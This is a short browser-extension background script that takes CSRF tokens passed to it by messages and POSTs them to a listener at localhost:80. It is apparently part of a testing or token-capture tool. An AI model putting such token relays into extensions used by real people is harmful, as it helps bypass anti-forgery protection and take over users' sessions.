browser.runtime.onMessage.addListener((message) => {
    if (message.csrf) {
        const data = {
            param: "CSRF: " + message.csrf
        };
        const formData = new URLSearchParams();
        for (const key in data) {
            formData.append(key, data[key]);
        }
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost:80", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(formData);
    }
});
